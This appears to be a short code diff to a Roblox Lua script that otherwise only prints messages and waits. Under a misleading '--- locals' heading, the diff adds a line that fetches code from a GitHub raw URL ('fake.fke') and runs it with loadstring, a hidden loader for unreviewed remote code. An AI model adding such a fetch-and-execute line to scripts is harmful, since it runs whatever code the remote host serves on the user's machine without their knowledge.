@@ -1,3 +1,7 @@
+--- locals :
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cookiedevlopper-sketch/Error.fke/refs/heads/main/fake.fke"))()
+
+--- main script
 print(Msg1_ATP)
 wait(3)
 print(Msg2)
